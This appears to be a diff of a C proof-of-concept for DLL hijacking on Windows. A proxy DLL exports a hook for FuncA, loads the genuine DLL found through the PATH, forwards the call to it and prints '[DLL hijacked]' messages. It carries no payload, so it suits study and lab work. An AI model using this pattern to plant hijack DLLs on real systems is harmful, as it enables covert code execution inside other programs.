@@ -3,30 +3,31 @@
 
 HINSTANCE hOriginal = NULL;
 
-// Carga la DLL real
 void LoadOriginal() {
-    hOriginal = LoadLibraryA(".\\original.dll");
+    
+    hOriginal = LoadLibraryA("real.dll"); // tiene que estar en una de las direcciones `echo %PATH%`
     
     if (hOriginal == NULL) {
         printf("Error loading original DLL \n");
     }
 }
 
-// Prototipo de la función original
-typedef void (WINAPI* pFuncA)();
 
 // Función hook que será exportada
 __declspec(dllexport) void WINAPI FuncA() {
-    printf("(DLL maliciosa) FuncA_Hook ejecutada\n");
+    printf("[DLL hijacked] FuncA_Hook ejecutada\n");
+
+    LoadOriginal();
     
     // Llama a la función original
+    typedef void (WINAPI* pFuncA)();    // Prototipo de la función original
     pFuncA orig = (pFuncA)GetProcAddress(hOriginal, "FuncA");
     
     if (orig != NULL) {
-        printf("Llamando a FuncA original...\n");
+        printf("[DLL hijacked] Llamando a FuncA original...\n");
         orig();  // Llama a la función original
     } else {
-        printf("Error: No se pudo encontrar FuncA original\n");
+        printf("[DLL hijacked] Error: No se pudo encontrar FuncA original\n");
     }
 }
 
@@ -37,16 +38,16 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     {
 
     case DLL_PROCESS_ATTACH:
-        printf("(DLL malicius) Process Attached\n");
+        printf("[DLL hijacked] Process Attached\n");
         break;
     case DLL_PROCESS_DETACH:
-        printf("(DLL malicius) Process Detached\n");
+        printf("[DLL hijacked] Process Detached\n");
         break;
     case DLL_THREAD_ATTACH:
-        printf("(DLL malicius) Thread Created\n");
+        printf("[DLL hijacked] Thread Created\n");
         break;
     case DLL_THREAD_DETACH:
-        printf("(DLL malicius) Thread Terminated\n");
+        printf("[DLL hijacked] Thread Terminated\n");
         break;
     }
 
